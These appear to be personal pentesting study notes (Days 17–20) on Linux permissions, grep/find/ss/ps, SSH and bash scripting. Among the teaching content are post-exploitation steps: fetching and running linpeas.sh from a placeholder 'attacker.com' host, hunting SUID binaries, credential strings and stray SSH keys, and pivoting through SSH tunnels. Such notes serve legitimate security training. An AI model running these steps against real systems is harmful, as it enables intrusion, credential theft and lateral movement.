## Day 17 — Linux File Permissions & Ownership

### Why Permissions Matter for Pentesting

Linux permissions are both a defence mechanism and an attack surface. Understanding them means:
- You know what you can access with your current user
- You can identify misconfigurations that allow privilege escalation
- You understand why SUID binaries are dangerous
- You can read `ls -la` output instantly and know what it means

---

### Reading Permission Strings

Every file and directory has a 10-character permission string visible in `ls -la`:

```
-rwxr-xr--  1  cyberuser  cyberuser  4096  Jan 1 12:00  script.sh
^            ^  ^          ^          ^     ^             ^
|            |  |          |          |     |             filename
|            |  |          |          |     last modified
|            |  |          |          file size
|            |  |          group owner
|            |  user owner
|            number of hard links
permission string
```

**Breaking down the permission string:**

```
- r w x r - x r - -
^ ^ ^ ^ ^ ^ ^ ^ ^ ^
| |___|   |___|   |__ other: read only
| user    group
file type
```

| Position | Meaning |
|---|---|
| 1 | File type: `-` = file, `d` = directory, `l` = symlink |
| 2-4 | Owner (user) permissions: rwx |
| 5-7 | Group permissions: rwx |
| 8-10 | Others (everyone else) permissions: rwx |

**Permission characters:**
| Char | File meaning | Directory meaning |
|---|---|---|
| `r` | Read file contents | List directory contents |
| `w` | Modify file contents | Create/delete files inside |
| `x` | Execute as a program | Enter the directory (cd into it) |
| `-` | Permission denied | Permission denied |

---

### Numeric (Octal) Permissions

Each permission has a numeric value:
```
r = 4
w = 2
x = 1
- = 0
```

Add them up for each group:
```
rwx = 4+2+1 = 7
rw- = 4+2+0 = 6
r-x = 4+0+1 = 5
r-- = 4+0+0 = 4
--- = 0+0+0 = 0
```

**Common permission sets:**
| Numeric | String | Typical use |
|---|---|---|
| 777 | rwxrwxrwx | World-writable — dangerous, potential privesc |
| 755 | rwxr-xr-x | Standard for executables and directories |
| 644 | rw-r--r-- | Standard for files |
| 600 | rw------- | Private files (SSH keys) |
| 400 | r-------- | Read-only, owner only |
| 000 | ---------- | No access at all |

**Quick mental math:** 755 = owner can do everything, group and others can read and execute but not write.

---

### Changing Permissions — chmod

```bash
chmod 755 script.sh             — set permissions numerically
chmod +x script.sh              — add execute for all users
chmod -w file.txt               — remove write for all users
chmod u+x script.sh             — add execute for user (owner) only
chmod g-w file.txt              — remove write for group
chmod o-r file.txt              — remove read for others
chmod -R 755 /var/www/          — recursive — apply to directory and all contents
```

**Symbolic notation:**
- `u` = user (owner)
- `g` = group
- `o` = others
- `a` = all (user + group + others)
- `+` = add permission
- `-` = remove permission
- `=` = set exact permission

---

### Changing Ownership — chown

```bash
chown cyberuser file.txt                — change owner
chown cyberuser:cyberuser file.txt      — change owner and group
chown root:root /etc/important          — give root ownership
chown -R cyberuser:cyberuser ~/scripts/ — recursive ownership change
```

Only root can change ownership of files you don't own.

---

### Special Permission Bits — Critical for Pentesting

Beyond rwx there are three special bits that are crucial for privilege escalation.

#### SUID — Set User ID (bit 4000)
When a file has SUID set, it runs as its **owner** rather than the user executing it.

```bash
ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 /usr/bin/passwd
    ^
    s = SUID set (owner execute position)
```

`passwd` is owned by root and has SUID set. When a normal user runs `passwd` to change their password, it runs with root privileges temporarily — that's how it can write to `/etc/shadow` which only root can normally modify.

**Why SUID is a privesc goldmine:**
If any SUID binary can be exploited or abused to run arbitrary commands, those commands run as root.

```bash
find / -perm -4000 -type f 2>/dev/null     — find all SUID files on the system
```

Run this on any compromised machine. Check every result against GTFOBins (gtfobins.github.io) — a database of how to exploit misconfigured binaries for privilege escalation.

#### SGID — Set Group ID (bit 2000)
Similar to SUID but runs as the file's group instead. Less common but same principle.

```bash
find / -perm -2000 -type f 2>/dev/null     — find all SGID files
```

#### Sticky Bit (bit 1000)
Set on directories — only the owner of a file can delete it, even if others have write permission.

```bash
ls -la /tmp
drwxrwxrwt  ...  /tmp
         ^
         t = sticky bit set
```

`/tmp` is world-writable (anyone can create files) but only each file's owner can delete their own files.

---

### /etc/passwd and /etc/shadow

**`/etc/passwd`** — readable by everyone:
```
root:x:0:0:root:/root:/bin/bash
cyberuser:x:1000:1000::/home/cyberuser:/bin/bash
^         ^ ^    ^    ^ ^              ^
username  | uid  gid  | home dir       shell
          |           GECOS field
          x = password in /etc/shadow
```

**`/etc/shadow`** — only root can read:
```
cyberuser:$6$salt$hashedpassword:19000:0:99999:7:::
^         ^                      ^
username  hashed password         days since last change
```

The `$6$` prefix identifies SHA-512 hashing. During privilege escalation, getting read access to `/etc/shadow` means you can crack the hashes offline with John the Ripper or hashcat.

## Day 18 — Essential Linux Tools for Recon

### grep — Search File Contents

`grep` searches for patterns inside files. One of the most used commands in Linux.

```bash
grep "password" file.txt            — find lines containing "password"
grep -i "password" file.txt         — case insensitive
grep -r "password" /etc/            — recursive search through directory
grep -n "password" file.txt         — show line numbers
grep -v "comment" file.txt          — invert — show lines NOT matching
grep -l "password" /etc/*           — show filenames that contain the pattern
grep -A 3 "error" log.txt           — show 3 lines AFTER each match
grep -B 3 "error" log.txt           — show 3 lines BEFORE each match
grep -E "pattern1|pattern2" file    — extended regex — match either pattern
```

**Pentesting uses:**
```bash
grep -r "password" /home/            — search all home dirs for passwords
grep -r "api_key" /var/www/          — find API keys in web files
grep -i "root" /etc/passwd           — find root-level accounts
grep "FAILED" /var/log/auth.log      — find failed login attempts
grep "Accepted" /var/log/auth.log    — find successful logins
```

---

### find — Locate Files by Properties

`find` searches for files based on attributes — name, size, permissions, owner, modification time.

```bash
find /home -name "*.txt"                    — find all .txt files under /home
find / -name "config.php" 2>/dev/null       — find config.php anywhere
find / -name "*.bak" 2>/dev/null            — find backup files
find / -perm -4000 -type f 2>/dev/null      — find SUID files
find / -perm -2000 -type f 2>/dev/null      — find SGID files
find / -perm -0777 -type f 2>/dev/null      — find world-writable files
find / -user root -perm -4000 2>/dev/null   — SUID files owned by root
find /tmp -type f -newer /etc/passwd        — files newer than /etc/passwd
find / -size +10M -type f 2>/dev/null       — files larger than 10MB
find / -empty -type f 2>/dev/null           — empty files
find /home -name ".bash_history"            — find bash history files
```

**`2>/dev/null`** — redirects error messages (permission denied etc.) to /dev/null so your output is clean.

**Combining find with exec:**
```bash
find / -name "*.conf" -exec cat {} \;       — print contents of every .conf file found
find /home -name ".ssh" -exec ls -la {} \;  — list contents of all .ssh directories
```

---

### netstat / ss — Network Connections

`netstat` is being replaced by `ss` on modern Linux but both work. Know both.

```bash
netstat -an                         — all connections and listening ports
netstat -tulpn                      — TCP/UDP listening ports with process names
netstat -antp                       — TCP connections with process IDs

ss -tulpn                           — same as netstat -tulpn but faster
ss -an                              — all sockets
ss -tnp                             — TCP connections with process info
```

**Reading the output:**
```
Proto  Local Address       Foreign Address     State     PID/Program
tcp    0.0.0.0:22          0.0.0.0:*           LISTEN    1234/sshd
tcp    127.0.0.1:3306      0.0.0.0:*           LISTEN    5678/mysqld
tcp    192.168.1.10:22     192.168.1.5:49832   ESTABLISHED 1234/sshd
```

**During post-exploitation on Linux:**
```bash
ss -tulpn                           — what services are running locally?
ss -an | grep ESTABLISHED           — what connections are active?
```

Services listening on `127.0.0.1` (localhost only) are internal — they're not exposed to the network but may be reachable after getting a foothold. MySQL on 127.0.0.1:3306 means there's a database running locally — potential for reading credentials from web app config files.

---

### ps — Process Status

```bash
ps aux                              — all processes, all users, full details
ps aux | grep apache                — find apache processes
ps aux | grep root                  — processes running as root
ps -ef --forest                     — process tree — shows parent/child relationships
```

**Reading ps aux output:**
```
USER    PID  %CPU %MEM    VSZ   RSS TTY  STAT  START   TIME COMMAND
root      1   0.0  0.1  16952  3804 ?    Ss    10:00   0:01 /sbin/init
www-data  842  0.1  0.5  89832  11200 ?  S     10:01   0:03 apache2
```

`www-data` is the standard web server user — if you exploit a web application you'll likely get a shell as `www-data`. Your goal then is to escalate from `www-data` to root.

### curl and wget — Fetch Data from URLs

```bash
curl http://example.com                     — GET request
curl -v http://example.com                  — verbose — shows headers
curl -I http://example.com                  — HEAD request — headers only
curl -X POST -d "user=admin" http://target  — POST request
curl -o file.html http://example.com        — save to file
curl -L http://example.com                  — follow redirects
curl -k https://target                      — ignore SSL errors
curl -H "Cookie: session=abc123" http://target  — add custom header
curl -u admin:password http://target        — basic auth

wget http://example.com/file.zip            — download a file
wget -r http://example.com                  — recursive download (mirror site)
wget -q http://example.com                  — quiet mode
```

**Post-exploitation use — download tools to compromised machine:**
```bash
wget http://attacker.com/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

### Pipes and Redirection

```bash
command > file.txt              — redirect output to file (overwrite)
command >> file.txt             — redirect output to file (append)
command 2>/dev/null             — redirect errors to /dev/null (suppress)
command 2>&1                    — redirect errors to same place as output
command | grep "pattern"        — pipe output to grep
command | sort                  — pipe output to sort
command | uniq                  — remove duplicate lines
command | wc -l                 — count lines of output
command | head -20              — show first 20 lines of output
command | tail -20              — show last 20 lines of output
command | tee file.txt          — output to both terminal and file simultaneously
```

**Chaining — real examples:**
```bash
ps aux | grep root | grep -v grep          — root processes, excluding grep itself
find / -perm -4000 2>/dev/null | sort      — sorted list of SUID files
cat /etc/passwd | cut -d: -f1             — extract just usernames
netstat -an | grep LISTEN | grep tcp      — TCP listening ports only
```

## Day 19 — SSH: Secure Shell

### SSH Theory

SSH (Secure Shell) is an encrypted protocol for remote terminal access. It replaced Telnet (which sends everything in plaintext) and is the standard for remote server management.

**Default port:** 22  
**Protocol:** TCP  
**Encryption:** AES-256 (symmetric) for data, RSA/ECDSA/Ed25519 for key exchange

---

### SSH Authentication Methods

#### Password Authentication
```bash
ssh username@192.168.1.10           — connect with password prompt
ssh -p 2222 username@192.168.1.10  — connect on non-standard port
```
Simple but vulnerable to brute-force attacks. Should be disabled on production servers.

#### Key-Based Authentication
More secure — no password to brute-force. A cryptographic key pair is used instead.

**How it works:**
1. You generate a key pair — `id_rsa` (private) and `id_rsa.pub` (public)
2. Public key is placed in `~/.ssh/authorized_keys` on the server
3. When you connect, SSH proves you have the private key without ever sending it
4. Server grants access without a password

---

### Generating SSH Keys

```bash
ssh-keygen -t rsa -b 4096              — RSA 4096-bit key (standard)
ssh-keygen -t ed25519                  — Ed25519 key (modern, recommended)
```

Files created:
```
~/.ssh/id_rsa           — PRIVATE KEY — never share, never commit to GitHub
~/.ssh/id_rsa.pub       — PUBLIC KEY — safe to share, goes on servers
```

**Copy public key to server:**
```bash
ssh-copy-id username@192.168.1.10      — copies ~/.ssh/id_rsa.pub to server
```

This appends your public key to `~/.ssh/authorized_keys` on the remote server.

**Manual copy (if ssh-copy-id not available):**
```bash
cat ~/.ssh/id_rsa.pub | ssh username@server "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
```

---

### SSH Configuration Hardening

Edit `/etc/ssh/sshd_config` to harden SSH:

```bash
sudo vim /etc/ssh/sshd_config
```

Important settings:
```
Port 2222                       # Change from default 22 (minor obscurity)
PermitRootLogin no              # Prevent direct root login
PasswordAuthentication no       # Key-only auth — disable password login
MaxAuthTries 3                  # Lock out after 3 failed attempts
AllowUsers cyberuser            # Whitelist specific users only
```

Apply changes:
```bash
sudo systemctl restart ssh
```

---

### SSH for Pentesting

**SSH as a post-exploitation tool:**

After getting a shell via exploitation, SSH provides a more stable, persistent connection than a raw reverse shell.

**Port forwarding — local:**
```bash
ssh -L 8080:localhost:80 user@target
```
Forwards port 8080 on YOUR machine to port 80 on the target. Access `localhost:8080` in your browser to reach the target's web server — even if port 80 isn't exposed externally.

**Port forwarding — remote:**
```bash
ssh -R 4444:localhost:4444 user@target
```
Forwards port 4444 on the TARGET to port 4444 on YOUR machine. Used to receive reverse shells through SSH tunnels.

**Dynamic SOCKS proxy:**
```bash
ssh -D 9050 user@target
```
Creates a SOCKS5 proxy through the SSH connection. Route all your traffic through the compromised machine — useful for pivoting into internal networks.

**Lateral movement with found keys:**
```bash
# On compromised machine, find SSH keys
find /home -name "id_rsa" 2>/dev/null
find /root -name "id_rsa" 2>/dev/null

# Try the found key against other machines in network
ssh -i /home/user/.ssh/id_rsa user@192.168.1.20
```

---

### ~/.ssh/ Directory Structure

```
~/.ssh/
├── id_rsa              — your private key
├── id_rsa.pub          — your public key
├── authorized_keys     — public keys of users allowed to log in as you
├── known_hosts         — fingerprints of servers you've connected to
└── config              — SSH client configuration shortcuts
```

**SSH config file — saves typing:**
```
Host targetbox
    HostName 192.168.1.10
    User cyberuser
    Port 22
    IdentityFile ~/.ssh/id_rsa
```

Now instead of `ssh -i ~/.ssh/id_rsa cyberuser@192.168.1.10` you just type `ssh targetbox`.

## Day 20 — Bash Scripting

### Bash Scripting Fundamentals

Every bash script starts with a shebang line telling the OS which interpreter to use:
```bash
#!/bin/bash
```

Make it executable before running:
```bash
chmod +x script.sh
./script.sh
```

---

### Variables

```bash
name="cyberuser"            # no spaces around =
echo $name                  # use variable with $
echo "$name"                # double quotes — variable expands
echo '$name'                # single quotes — literal, no expansion
echo "${name}_suffix"       # curly braces for clarity

# Command substitution
ip=$(hostname -I)           # store command output in variable
date=$(date +%Y%m%d)        # store formatted date
```

---

### Special Variables

```bash
$0          — script name
$1, $2...   — positional arguments
$#          — number of arguments
$@          — all arguments as separate strings
$?          — exit code of last command (0=success, non-zero=failure)
$$          — PID of current process
$USER       — current username
$HOME       — home directory path
$PATH       — executable search path
```

---

### Conditionals

```bash
if [ "$variable" == "value" ]; then
    echo "match"
elif [ "$variable" == "other" ]; then
    echo "other match"
else
    echo "no match"
fi

# Numeric comparison (use -eq not ==)
if [ $count -eq 0 ]; then echo "zero"; fi
if [ $count -gt 10 ]; then echo "greater than 10"; fi
if [ $count -lt 5 ]; then echo "less than 5"; fi

# File checks
if [ -f "file.txt" ]; then echo "file exists"; fi
if [ -d "folder" ]; then echo "directory exists"; fi
if [ -r "file.txt" ]; then echo "file is readable"; fi
if [ -x "script.sh" ]; then echo "file is executable"; fi
if [ -s "file.txt" ]; then echo "file is not empty"; fi

# Argument check — always validate inputs
if [ $# -eq 0 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi
```

---

### Loops

```bash
# For loop — range
for i in $(seq 1 254); do
    echo "Host: 192.168.1.$i"
done

# For loop — list
for port in 21 22 23 25 80 443 445 3306 3389; do
    echo "Checking port $port"
done

# While loop — read file line by line
while IFS= read -r line; do
    echo "Word: $line"
done < wordlist.txt

# While loop — infinite (with break)
while true; do
    read -r input
    if [ "$input" == "quit" ]; then break; fi
    echo "You said: $input"
done
```

### The 4 Scripts from Day 20

#### Script 1 — Ping Sweeper
```bash
#!/bin/bash
network="10.0.2"
echo "[*] Scanning $network.0/24..."
for host in $(seq 1 254); do
    ping -c 1 -W 1 $network.$host > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] Host alive: $network.$host"
    fi
done
```

#### Script 2 — Wordlist Reader
```bash
#!/bin/bash
if [ $# -eq 0 ]; then echo "Usage: $0 <wordlist>"; exit 1; fi
while IFS= read -r word; do
    echo "[*] $word"
done < "$1"
```

#### Script 3 — Activity Logger
```bash
#!/bin/bash
logfile="$HOME/pentest_log_$(date +%Y%m%d).txt"
echo "Session: $(date)" >> "$logfile"
while true; do
    echo -n "cmd> "
    read -r cmd
    if [ "$cmd" == "exit" ]; then break; fi
    echo "[$(date +%H:%M:%S)] $cmd" >> "$logfile"
    eval "$cmd"
done
```

#### Script 4 — Recon Script
```bash
#!/bin/bash
if [ $# -eq 0 ]; then echo "Usage: $0 <domain>"; exit 1; fi
target=$1
mkdir -p "recon_$target"
whois "$target" > "recon_$target/whois.txt"
nslookup "$target" > "recon_$target/dns.txt"
nmap -sV --top-ports 100 "$target" > "recon_$target/nmap.txt"
theHarvester -d "$target" -b bing,dnsdumpster,crtsh -f "recon_$target/harvester.html" 2>/dev/null
echo "[+] Recon complete. Results in recon_$target/"
ls -lh "recon_$target/"
```

### Key Concepts Summary — Days 17–20

| Concept | One-Line Summary |
|---|---|
| `chmod 755` | Owner=all, Group=rx, Others=rx — standard for executables |
| SUID bit | File runs as owner — find with `find / -perm -4000 2>/dev/null` |
| `/etc/shadow` | Hashed passwords — $6$ = SHA-512, need root to read |
| `grep -r` | Recursive search through directories — essential for finding credentials |
| `find -perm -4000` | Find SUID files — first privesc check on any Linux machine |
| `ss -tulpn` | Show listening ports — find internal services after foothold |
| `ps aux` | All running processes — look for interesting processes running as root |
| `~/.bash_history` | Command history — check first on any compromised Linux machine |
| SSH key auth | `ssh-keygen` generates pair, public key to `authorized_keys`, private stays local |
| `id_rsa` | Private key — never share, if found on target try against other machines |
| SSH port forwarding | `-L` local forward, `-R` remote forward, `-D` SOCKS proxy for pivoting |
| `$?` | Exit code — 0=success, non-zero=failure — used in if statements |
| `2>/dev/null` | Suppress error output — use with find and other noisy commands |
| Bash shebang | `#!/bin/bash` — first line of every bash script |
